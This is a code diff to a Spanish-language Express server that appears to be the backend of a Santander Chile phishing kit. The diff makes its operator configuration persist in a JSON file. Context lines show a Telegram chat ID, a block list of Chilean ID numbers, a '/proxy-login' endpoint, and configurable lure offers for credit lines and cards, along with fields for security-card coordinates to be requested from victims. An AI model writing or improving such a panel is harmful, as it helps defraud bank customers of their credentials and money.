@@ -2,6 +2,7 @@ const express = require("express");
 const fetch = require("node-fetch");
 const cors = require("cors");
 const path = require("path");
+const fs = require("fs");
 
 const app = express();
 
@@ -20,18 +21,26 @@ const CHAT_ID = process.env.CHAT_ID;
 // Lista de RUT bloqueados
 const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];
 
-// Configuración en memoria
-let config = {
-  producto1: "Línea de Crédito",
-  monto1: 5000000,
-  producto2: "Tarjeta de Crédito WorldMember Limited Business",
-  monto2: 5000000,
-  tipoAutorizacion: "santander",
-  coord1: "",
-  coord2: "",
-  coord3: "",
-  factibilidad: "off" // Nueva propiedad independiente
-};
+// Archivo de configuración persistente
+const CONFIG_FILE = path.join(__dirname, "config.json");
+
+// Cargar configuración inicial desde archivo o defaults
+let config = {};
+if (fs.existsSync(CONFIG_FILE)) {
+  config = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
+} else {
+  config = {
+    producto1: "Línea de Crédito",
+    monto1: 5000000,
+    producto2: "Tarjeta de Crédito WorldMember Limited Business",
+    monto2: 5000000,
+    tipoAutorizacion: "santander",
+    coord1: "",
+    coord2: "",
+    coord3: "",
+    factibilidad: "off"
+  };
+}
 
 // Endpoint de login
 app.post("/proxy-login", async (req, res) => {
@@ -96,6 +105,7 @@ app.get("/config", (req, res) => {
 
 app.post("/config", (req, res) => {
   config = { ...config, ...req.body };
+  fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
   res.status(200).json({ message: "✅ Configuración guardada correctamente.", config });
 });
 
